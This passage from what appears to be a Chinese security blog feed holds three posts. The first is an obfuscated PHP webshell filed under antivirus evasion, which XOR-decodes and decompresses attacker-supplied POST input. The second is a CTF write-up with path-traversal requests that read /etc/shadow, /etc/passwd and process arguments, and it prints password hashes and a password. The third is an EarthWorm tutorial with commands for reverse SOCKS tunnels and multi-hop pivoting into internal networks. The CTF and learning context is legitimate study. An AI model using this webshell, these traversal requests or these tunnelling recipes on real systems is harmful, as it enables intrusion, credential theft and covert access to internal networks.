class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;161ebd7d&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;45089b3446ee&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;4e0d86dbcf92&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;r&#x27;</span>]), <span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// $o = &quot;system(&#x27;dir&#x27;);&quot;;</span></span><br><span class="line"><span class="comment">// $r = @base64_encode(@x(@gzcompress($o), $k));</span></span><br><span class="line"><span class="comment">// echo $r;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250119224604.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>suctf</title>
      <link href="/2025/01/19/suctf/"/>
      <url>/2025/01/19/suctf/</url>
      
        <content type="html"><![CDATA[<h4 id="onchain-checkin"><a href="#onchain-checkin" class="headerlink" title="onchain checkin"></a>onchain checkin</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[toolchain]</span><br><span class="line">solana_version = &quot;2.0.20&quot;</span><br><span class="line">anchor_version = &quot;0.30.1&quot;</span><br><span class="line"></span><br><span class="line">[provider]</span><br><span class="line">cluster = &quot;devnet&quot;</span><br><span class="line"></span><br><span class="line">solana_version = &quot;2.0.20&quot;</span><br><span class="line"></span><br><span class="line">这是指定使用的 Solana 版本。在这个例子中，指定了 2.0.20 版本。Solana 是一个高性能的区块链平台，版本号可以确保使用正确的功能和修复。</span><br><span class="line"></span><br><span class="line">anchor_version = &quot;0.30.1&quot;</span><br><span class="line"></span><br><span class="line">这是指定使用的 Anchor 版本。Anchor 是一个为 Solana 区块链提供的框架，旨在简化智能合约的开发。0.30.1 是指定的版本号，确保开发者使用的是特定版本的 Anchor。</span><br><span class="line"></span><br><span class="line">cluster = &quot;devnet&quot;</span><br><span class="line"></span><br><span class="line">这是设置 Solana 的集群环境。devnet 是一个为开发者提供的测试网络，类似于一个沙盒环境，适合开发和测试。在这个环境中进行的操作不会影响到真实的 Solana 主网</span><br></pre></td></tr></table></figure><h4 id="SU-check"><a href="#SU-check" class="headerlink" title="SU_check"></a>SU_check</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">GET /download?filename=../../../../../../../../../root/flag.txt HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/flag.txt&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 7</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:21 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">nonono</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../proc/self/cmdline HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cmdline&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 65</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:26 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">java.-jar.suctf-0.0.1-SNAPSHOT.jar.--password=SePassWordLen23SUCT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../root/start.sh HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../root/start.sh&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:32 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/hint&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 27</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:38 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">algorithm=PBEWithMD5AndDES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../etc/shadow HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/shadow&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 909</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:43 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">root:$6$MI.uuGSS7qKn4rEK$NlYB/kaAeRmd3CYY4mxDuMMMh1PzQZHTEL.BV3Dosp.15kD3MgSDzqbYRRazeglIRVAfe6ATwRZ9ekSwNTkit0:20077:0:99999:7:::</span><br><span class="line">daemon:*:20007:0:99999:7:::</span><br><span class="line">bin:*:20007:0:99999:7:::</span><br><span class="line">sys:*:20007:0:99999:7:::</span><br><span class="line">sync:*:20007:0:99999:7:::</span><br><span class="line">games:*:20007:0:99999:7:::</span><br><span class="line">man:*:20007:0:99999:7:::</span><br><span class="line">lp:*:20007:0:99999:7:::</span><br><span class="line">mail:*:20007:0:99999:7:::</span><br><span class="line">news:*:20007:0:99999:7:::</span><br><span class="line">uucp:*:20007:0:99999:7:::</span><br><span class="line">proxy:*:20007:0:99999:7:::</span><br><span class="line">www-data:*:20007:0:99999:7:::</span><br><span class="line">backup:*:20007:0:99999:7:::</span><br><span class="line">list:*:20007:0:99999:7:::</span><br><span class="line">irc:*:20007:0:99999:7:::</span><br><span class="line">gnats:*:20007:0:99999:7:::</span><br><span class="line">nobody:*:20007:0:99999:7:::</span><br><span class="line">_apt:*:20007:0:99999:7:::</span><br><span class="line">systemd-timesync:*:20077:0:99999:7:::</span><br><span class="line">systemd-network:*:20077:0:99999:7:::</span><br><span class="line">systemd-resolve:*:20077:0:99999:7:::</span><br><span class="line">messagebus:*:20077:0:99999:7:::</span><br><span class="line">sshd:*:20077:0:99999:7:::</span><br><span class="line">hacker:$6$rzdplO02wm/607Io$v9gjdKBiuEdA0F28qx1REs/L4Qo9dqBQD.fUUjans5qn/sWOjSffHWzlMvgwzxHyyrfSA8kLilzMMRGhRNHLk0:20077:0:99999:7:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../proc/self/cwd/BOOT-INF/classes/application.properties&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 133</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:47 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">spring.application.name=suctf</span><br><span class="line">server.port = 8888</span><br><span class="line">OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=</span><br><span class="line"></span><br><span class="line">GET /download?filename=../../../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: 192.168.58.128</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment; filename=&quot;../../../../../../../../../etc/passwd&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1322</span><br><span class="line">Date: Thu, 09 Jan 2025 06:59:53 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">hacker:x:1000:1000::/home/hacker:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是把密钥找到，密钥少了四位，补全解密就行。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ew-内网</title>
      <link href="/2025/01/17/ew-%E5%86%85%E7%BD%91/"/>
      <url>/2025/01/17/ew-%E5%86%85%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h4 id="1-使用场景"><a href="#1-使用场景" class="headerlink" title="1. 使用场景"></a>1. 使用场景</h4><p>我认为他的使用场景讲的已经是非常详细了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">普通网络环境：</span><br><span class="line">    1.  目标网络边界存在公网IP且可任意开监听端口：</span><br><span class="line"></span><br><span class="line">              +---------+     +-------------------+  </span><br><span class="line">              |HackTools| -&gt;&gt; | 8888-&gt;  1.1.1.1   |</span><br><span class="line">              +---------+     +-------------------+</span><br><span class="line"></span><br><span class="line">            a)./ew -s ssocksd -l 8888</span><br><span class="line">                    // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br><span class="line">            b) HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</span><br><span class="line">                </span><br><span class="line">    2.  目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理</span><br><span class="line">        </span><br><span class="line">                                    一台可控公网IP主机                  可控内网主机</span><br><span class="line">              +---------+     +--------------------------+    |     +---------------+</span><br><span class="line">              |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2  |</span><br><span class="line">              +---------+     +--------------------------+    |     +---------------+</span><br><span class="line"></span><br><span class="line">            a) ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">                        // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br><span class="line">            b) ./ew -s rssocks -d 1.1.1.1 -e 8888          </span><br><span class="line">                        // 将目标网络的可控边界主机反向连接公网主机</span><br><span class="line"></span><br><span class="line">            c) HackTools 可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</span><br><span class="line"></span><br><span class="line">对于二重网络环境：        </span><br><span class="line">    1.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</span><br><span class="line"></span><br><span class="line">            A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源</span><br><span class="line">            B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</span><br><span class="line">            A 主机可直连 B 主机</span><br><span class="line">            </span><br><span class="line">                                    可控边界主机A             可访问指定资源的主机B</span><br><span class="line">              +---------+     +-----------------------+      +-----------------+</span><br><span class="line">              |HackTools| -&gt;&gt; | 1080 --&gt;  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 2.2.2.3 |</span><br><span class="line">              +---------+     +-----------------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">            a)  ./ew -s ssocksd -l 9999</span><br><span class="line">                    // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br><span class="line">            b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 </span><br><span class="line">                    // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。</span><br><span class="line">            c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。</span><br><span class="line">            </span><br><span class="line">    2.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</span><br><span class="line"></span><br><span class="line">            A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。</span><br><span class="line">            B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。</span><br><span class="line"></span><br><span class="line">            A 主机可直连 B 主机</span><br><span class="line">                                  一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B</span><br><span class="line">              +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line">              |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt; | 9999 -&gt; 2.2.2.3 |</span><br><span class="line">              +---------+     +--------------------------+    |    +-----------------+      +-----------------+</span><br><span class="line"></span><br><span class="line">            a)  ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">                        // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求</span><br><span class="line">                        // 转交给反连 8888 端口的主机</span><br><span class="line">            b)  ./ew -s ssocksd -l 9999</span><br><span class="line">                        // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br><span class="line">            c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br><span class="line">                        // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道</span><br><span class="line">            d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-三级跳"><a href="#2-三级跳" class="headerlink" title="2. 三级跳"></a>2. 三级跳</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">    </span><br><span class="line">通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</span><br><span class="line"></span><br><span class="line">下面是一个三级跳的本地测试例子。。。</span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">./ew -s rssocks -d 127.0.0.1 -e 7777</span><br><span class="line"></span><br><span class="line">数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks </span><br></pre></td></tr></table></figure><h4 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h4><p>受害机器 </p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250117223656.png" alt="image.png"></p><p>vps<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250117223743.png" alt="image.png"></p><p>配置vps proxychains代理,根据两个连接之后的结果可以直接访问内网机器<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250117223930.png" 